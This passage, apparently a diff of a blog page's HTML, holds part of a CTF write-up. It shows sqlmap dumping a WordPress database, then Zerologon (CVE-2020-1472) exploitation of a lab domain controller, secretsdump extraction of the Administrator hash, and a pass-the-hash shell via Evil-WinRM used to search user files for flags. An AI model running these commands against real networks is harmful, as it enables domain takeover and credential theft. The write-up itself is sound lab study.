+</span></span></span><span style=display:flex><span><span style=color:#e6db74>back-end DBMS: MySQL &gt;= 5.0.12
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:26:47] [WARNING] HTTP error codes detected during run:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>404 (Not Found) - 46 times, 500 (Internal Server Error) - 4 times
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:26:47] [INFO] fetched data logged to text files under &#39;/home/cakehonolulu/.local/share/sqlmap/output/wp.geohome.com&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ending @ 15:26:47 /2022-05-22/</span></span></span></code></pre></div></details><p>We can see that it&rsquo;s both vulnerable to a boolean and a time-based SQLi; let&rsquo;s exploit that:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1 *&#34;</span> --dump-all</span></span></code></pre></div><p>We wait for a bit and we can see that there&rsquo;s a table named &lsquo;flag&rsquo;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fetching tables <span style=color:#66d9ef>for</span> databases: <span style=color:#e6db74>&#39;flag, information_schema, wordpress&#39;</span></span></span></code></pre></div><p>Let&rsquo;s dump that one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1 *&#34;</span> --dump --code<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span> --dbms<span style=color:#f92672>=</span>MySQL -D flag</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>Database</span>: flag
+</span></span><span style=display:flex><span><span style=color:#66d9ef>Table</span>: flag
+</span></span><span style=display:flex><span>[<span style=color:#ae81ff>1</span> entry]
+</span></span><span style=display:flex><span><span style=color:#f92672>+</span><span style=color:#75715e>-----------------------+
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>|</span> flag                  <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>+</span><span style=color:#75715e>-----------------------+
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>|</span> FLAG<span style=color:#960050;background-color:#1e0010>{</span>Update_Plugins<span style=color:#f92672>!</span><span style=color:#960050;background-color:#1e0010>}</span> <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>+</span><span style=color:#75715e>-----------------------+</span></span></span></code></pre></div><p>Bingo: <code>FLAG{Update_Plugins!}</code></p><h1 id=windows-exploitation>Windows Exploitation</h1><br>Now we'll jump straight to Windows exploiting; while I was discussing the CTF with a NUWE employer, I told them that I found
 LDAP Ports opened on the machine (Along SMB, RPC...) so those were interesting targets for me just as I saw them, but decided
-against starting w/ those due to finding web exploiting generally easier.
-<p>So what I did next is trying to find information regarding the Active Directory running in the machine, for that, I used CrackMapExec.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cme smb 192.168.1.145</span></span></code></pre></div>
-<p>This returned:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SMB 192.168.1.145   445GEOHOME-DC   <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:GEOHOME-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:geohome.com<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span></span></span></code></pre></div>
-<p>We now have a domain controller name.</p>
-<p>According to Wikipedia, Build 17763 was launched in Q4 2018; so it&rsquo;s a little bit old&hellip; Let&rsquo;s start to look for Active Directory vulns on cvedetails that match our findings.</p>
-<p>While it&rsquo;s true that you could go ahead and try a vast list of vulns; I went the zerologon way (CVE-2020-1472); HackTheBox&rsquo;s Multimaster Machine was exploited the same way so why not reuse those concepts.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/zeronetworks/zerologon <span style="color:#f92672">&amp;&amp;</span> cd zerologon/</span></span></code></pre></div>
-<p>Let&rsquo;s run the tester script with our newly found Domain Controller Name:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python zerologon.py GEOHOME-DC 192.168.1.145</span></span></code></pre></div>
-<p>Which yields:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Performing authentication attempts...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================================================================================================</span>
-</span></span><span style="display:flex;"><span>Success! DC can be fully compromised by a Zerologon attack.</span></span></code></pre></div>
-<p>Nice</p>
-<p>Let&rsquo;s pwn it then.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/dirkjanm/CVE-2020-1472 <span style="color:#f92672">&amp;&amp;</span> cd CVE-2020-1472/</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python cve-2020-1472-exploit.py GEOHOME-DC 192.168.1.145</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Performing authentication attempts...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">================================================================================================================================================================================================================================================================================================================================================================================================================================</span>
-</span></span><span style="display:flex;"><span>Target vulnerable, changing account password to empty string
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Result: <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Exploit complete!</span></span></code></pre></div>
-<p>:)</p>
-<p>Let&rsquo;s try to log in using WinRM and the PTH technique, but first; we need a hash, let&rsquo;s obtain them.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ secretsdump.py -no-pass -just-dc GEOHOME-DC<span style="color:#ae81ff">\$</span>@192.168.1.145</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
-</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:84a131ab8d386e13ab59b91fece79b2c:::
-</span></span><span style="display:flex;"><span>...</span></span></code></pre></div>
-<p>We have the hash: <code>84a131ab8d386e13ab59b91fece79b2c</code></p>
-<p>Let&rsquo;s use Evil-WinRM:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ evil-winrm -i 192.168.1.145 -u Administrator -H 84a131ab8d386e13ab59b91fece79b2c</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Evil-WinRM shell v3.3
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;</span></span></code></pre></div>
-<p>:)</p>
-<p>Navigate back to C:\Users and &ldquo;grep&rdquo; for strings</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt; dir -Recurse | Select-String -pattern <span style="color:#e6db74">&#34;FLAG{&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>eescalera<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\e</span>escalera_flag.txt:1:FLAG<span style="color:#f92672">{</span>Mas_uno_por_revisar_sistema<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>jenriques<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\j</span>enriques_flag.txt:1:FLAG<span style="color:#f92672">{</span>Buen_Password_Spraying_Eh?<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>pcasimiro<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\p</span>scasimiro_flag.txt:1:FLAG<span style="color:#f92672">{</span>Pesadilla_en_el_trabajo<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>sguerrero<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\s</span>guerrero_flag.txt:1:FLAG<span style="color:#f92672">{</span>Ay_Ay_Vigila_Tu_Puesto<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>svc-spooler<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\s</span>vc-spooler_flag.txt:1:FLAG<span style="color:#f92672">{</span>A_su_servicio<span style="color:#f92672">}</span></span></span></code></pre></div>
-<p>Bingo: <code>FLAG{Mas_uno_por_revisar_sistema}, FLAG{Buen_Password_Spraying_Eh?}, FLAG{Pesadilla_en_el_trabajo}, FLAG{Ay_Ay_Vigila_Tu_Puesto}, FLAG{A_su_servicio}</code></p>
-<p><img src="/images/ctfs/schneidelec/zzz.webp" alt="ZZZ"></p>
-<p>:)</p>
-<p>We&rsquo;re missing two&hellip; but we already know where to look due to our previous <em>unintended forensics</em></p>
-<p>Navigate to <code>C:\Users\jenriques\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt;cat <span style="color:#e6db74">&#34;C:/Users/jenriques/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal&#34;</span> | Select-String -pattern <span style="color:#e6db74">&#34;FLAG{&#34;</span>
-</span></span><span style="display:flex;"><span>UU<span style="color:#ae81ff">\i</span>d<span style="color:#f92672">=</span>90336dbc-1c1c-4b44-9248-0baeb830ae8d FLAG<span style="color:#f92672">{</span>Sticky_Notes_FTW<span style="color:#f92672">}</span>Yellow2bedc0aa-697a-4c7d-8dbd-73be78fea130cad54964-46bd-4474-b3e5-de66bf65232Ú64
-</span></span><span style="display:flex;"><span>U<span style="color:#ae81ff">\i</span>d<span style="color:#f92672">=</span>61c9897a-1a87-45f1-aaf6-526d769313c5 Nombre: Saray Guerrero</span></span></code></pre></div>
-<p><code>FLAG{Sticky_Notes_FTW}</code></p>
-<p>Oh and&hellip;</p>
-<p>We can look for hidden files&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt;Get-ChildItem -Recurse -Hidden
-</span></span><span style="display:flex;"><span>Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\e</span>escalera<span style="color:#ae81ff">\D</span>ownloads
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ModeLastWriteTime Length Name
-</span></span><span style="display:flex;"><span>----------------- ------ ----
-</span></span><span style="display:flex;"><span>-a-h--5/18/2022   8:05 PM201 private_email</span></span></code></pre></div>
-<p>:)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM*&lt;/code&gt; PS&lt;/code&gt; cat <span style="color:#e6db74">&#34;C:/Users/eescalera/Downloads/private_email&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>EmailTo<span style="color:#f92672">]</span>: eescalera@geohome.com
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>EmailFrom<span style="color:#f92672">]</span>: ffuertes@geohome.com
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Subject<span style="color:#f92672">]</span>: Instagram
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Attachment<span style="color:#f92672">]</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Body<span style="color:#f92672">]</span>:
-</span></span><span style="display:flex;"><span>Toma, este es mi Instagram: https://www.instagram.com/ferfuertes1990/. ¡Sígueme!</span></span></code></pre></div>
-<p><img src="/images/ctfs/schneidelec/instagram.jpeg" alt="Instagram"></p>
-<p><code>FLAG{El_Buen_OSINT_Naito}</code></p>
-<p><a href="https://www.youtube.com/watch?v=CS2kkzTfePU"><h3>12/12 Flags Found</h3></a></p>
-<p><i>- mess with the best die like the rest.</i></p>
-
-
-    <ul>
-    
-    </ul>
-
-
-            </section>
-
-            <section class="page__aside">
-                <div class="aside__about">
-
-<ul class="aside__social-links">
-    
-    <li>
-        <a href="https://github.com/cakehonolulu" rel="me" aria-label="My GitHub" title="My GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-    <li>
-        <a href="https://twitter.com/cakehonolulu" rel="me" aria-label="My Twitter" title="My Twitter"><i class="fa-brands fa-twitter" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-    <li>
-        <a href="https://www.linkedin.com/in/joel-bueno-39893a230" rel="me" aria-label="My LinkedIn" title="My LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-</ul>
-</div>
-                <hr>
-                <div class="aside__content">
-                </div>
-            </section>
-
-            <footer class="page__footer"><p class="copyright"></p>
-<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
-</footer>
-
-        </div>
-    </body>
-
-</html>
+against starting w/ those due to finding web exploiting generally easier.<p>So what I did next is trying to find information regarding the Active Directory running in the machine, for that, I used CrackMapExec.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cme smb 192.168.1.145</span></span></code></pre></div><p>This returned:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>SMB 192.168.1.145   445GEOHOME-DC   <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Windows 10.0 Build <span style=color:#ae81ff>17763</span> x64 <span style=color:#f92672>(</span>name:GEOHOME-DC<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:geohome.com<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>signing:True<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>SMBv1:False<span style=color:#f92672>)</span></span></span></code></pre></div><p>We now have a domain controller name.</p><p>According to Wikipedia, Build 17763 was launched in Q4 2018; so it&rsquo;s a little bit old&mldr; Let&rsquo;s start to look for Active Directory vulns on cvedetails that match our findings.</p><p>While it&rsquo;s true that you could go ahead and try a vast list of vulns; I went the zerologon way (CVE-2020-1472); HackTheBox&rsquo;s Multimaster Machine was exploited the same way so why not reuse those concepts.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone https://github.com/zeronetworks/zerologon <span style=color:#f92672>&amp;&amp;</span> cd zerologon/</span></span></code></pre></div><p>Let&rsquo;s run the tester script with our newly found Domain Controller Name:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python zerologon.py GEOHOME-DC 192.168.1.145</span></span></code></pre></div><p>Which yields:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Performing authentication attempts...
+</span></span><span style=display:flex><span><span style=color:#f92672>=========================================================================================================</span>
+</span></span><span style=display:flex><span>Success! DC can be fully compromised by a Zerologon attack.</span></span></code></pre></div><p>Nice</p><p>Let&rsquo;s pwn it then.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone https://github.com/dirkjanm/CVE-2020-1472 <span style=color:#f92672>&amp;&amp;</span> cd CVE-2020-1472/</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python cve-2020-1472-exploit.py GEOHOME-DC 192.168.1.145</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Performing authentication attempts...
+</span></span><span style=display:flex><span><span style=color:#f92672>================================================================================================================================================================================================================================================================================================================================================================================================================================</span>
+</span></span><span style=display:flex><span>Target vulnerable, changing account password to empty string
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Result: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Exploit complete!</span></span></code></pre></div><p>:)</p><p>Let&rsquo;s try to log in using WinRM and the PTH technique, but first; we need a hash, let&rsquo;s obtain them.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ secretsdump.py -no-pass -just-dc GEOHOME-DC<span style=color:#ae81ff>\$</span>@192.168.1.145</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright <span style=color:#ae81ff>2022</span> SecureAuth Corporation
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping Domain Credentials <span style=color:#f92672>(</span>domain<span style=color:#ae81ff>\u</span>id:rid:lmhash:nthash<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:84a131ab8d386e13ab59b91fece79b2c:::
+</span></span><span style=display:flex><span>...</span></span></code></pre></div><p>We have the hash: <code>84a131ab8d386e13ab59b91fece79b2c</code></p><p>Let&rsquo;s use Evil-WinRM:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ evil-winrm -i 192.168.1.145 -u Administrator -H 84a131ab8d386e13ab59b91fece79b2c</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Evil-WinRM shell v3.3
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>ocuments&gt;</span></span></code></pre></div><p>:)</p><p>Navigate back to C:\Users and &ldquo;grep&rdquo; for strings</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>ocuments&gt; cd ..<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers&gt; dir -Recurse | Select-String -pattern <span style=color:#e6db74>&#34;FLAG{&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>eescalera<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\e</span>escalera_flag.txt:1:FLAG<span style=color:#f92672>{</span>Mas_uno_por_revisar_sistema<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>jenriques<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\j</span>enriques_flag.txt:1:FLAG<span style=color:#f92672>{</span>Buen_Password_Spraying_Eh?<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>pcasimiro<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\p</span>scasimiro_flag.txt:1:FLAG<span style=color:#f92672>{</span>Pesadilla_en_el_trabajo<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>sguerrero<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\s</span>guerrero_flag.txt:1:FLAG<span style=color:#f92672>{</span>Ay_Ay_Vigila_Tu_Puesto<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>svc-spooler<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\s</span>vc-spooler_flag.txt:1:FLAG<span style=color:#f92672>{</span>A_su_servicio<span style=color:#f92672>}</span></span></span></code></pre></div><p>Bingo: <code>FLAG{Mas_uno_por_revisar_sistema}, FLAG{Buen_Password_Spraying_Eh?}, FLAG{Pesadilla_en_el_trabajo}, FLAG{Ay_Ay_Vigila_Tu_Puesto}, FLAG{A_su_servicio}</code></p><p><img src=/images/ctfs/schneidelec/zzz.webp alt=ZZZ></p><p>:)</p><p>We&rsquo;re missing two&mldr; but we already know where to look due to our previous <em>unintended forensics</em></p><p>Navigate to <code>C:\Users\jenriques\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers&gt;cat <span style=color:#e6db74>&#34;C:/Users/jenriques/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal&#34;</span> | Select-String -pattern <span style=color:#e6db74>&#34;FLAG{&#34;</span>
+</span></span><span style=display:flex><span>UU<span style=color:#ae81ff>\i</span>d<span style=color:#f92672>=</span>90336dbc-1c1c-4b44-9248-0baeb830ae8d FLAG<span style=color:#f92672>{</span>Sticky_Notes_FTW<span style=color:#f92672>}</span>Yellow2bedc0aa-697a-4c7d-8dbd-73be78fea130cad54964-46bd-4474-b3e5-de66bf65232Ú64
+</span></span><span style=display:flex><span>U<span style=color:#ae81ff>\i</span>d<span style=color:#f92672>=</span>61c9897a-1a87-45f1-aaf6-526d769313c5 Nombre: Saray Guerrero</span></span></code></pre></div><p><code>FLAG{Sticky_Notes_FTW}</code></p><p>Oh and&mldr;</p><p>We can look for hidden files&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers&gt;Get-ChildItem -Recurse -Hidden
+</span></span><span style=display:flex><span>Directory: C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\e</span>escalera<span style=color:#ae81ff>\D</span>ownloads
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ModeLastWriteTime Length Name
+</span></span><span style=display:flex><span>----------------- ------ ----
+</span></span><span style=display:flex><span>-a-h--5/18/2022   8:05 PM201 private_email</span></span></code></pre></div><p>:)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM*&lt;/code&gt; PS&lt;/code&gt; cat <span style=color:#e6db74>&#34;C:/Users/eescalera/Downloads/private_email&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>EmailTo<span style=color:#f92672>]</span>: eescalera@geohome.com
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>EmailFrom<span style=color:#f92672>]</span>: ffuertes@geohome.com
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Subject<span style=color:#f92672>]</span>: Instagram
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Attachment<span style=color:#f92672>]</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Body<span style=color:#f92672>]</span>:
+</span></span><span style=display:flex><span>Toma, este es mi Instagram: https://www.instagram.com/ferfuertes1990/. ¡Sígueme!</span></span></code></pre></div><p><img src=/images/ctfs/schneidelec/instagram.jpeg alt=Instagram></p><p><code>FLAG{El_Buen_OSINT_Naito}</code></p><p><a href="https://www.youtube.com/watch?v=CS2kkzTfePU"><h3>12/12 Flags Found</h3></a></p><p><i>- mess with the best die like the rest.</i></p><ul></ul></section><section class=page__aside><div class=aside__about><ul class=aside__social-links><li><a href=https://github.com/cakehonolulu rel=me aria-label="My GitHub" title="My GitHub"><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=https://twitter.com/cakehonolulu rel=me aria-label="My Twitter" title="My Twitter"><i class="fa-brands fa-twitter" aria-hidden=true></i></a>&nbsp;</li><li><a href=https://www.linkedin.com/in/joel-bueno-39893a230 rel=me aria-label="My LinkedIn" title="My LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content></div></section><footer class=page__footer><p class=copyright></p><p class=advertisement>Powered by <a href=https://gohugo.io/>hugo</a> and <a 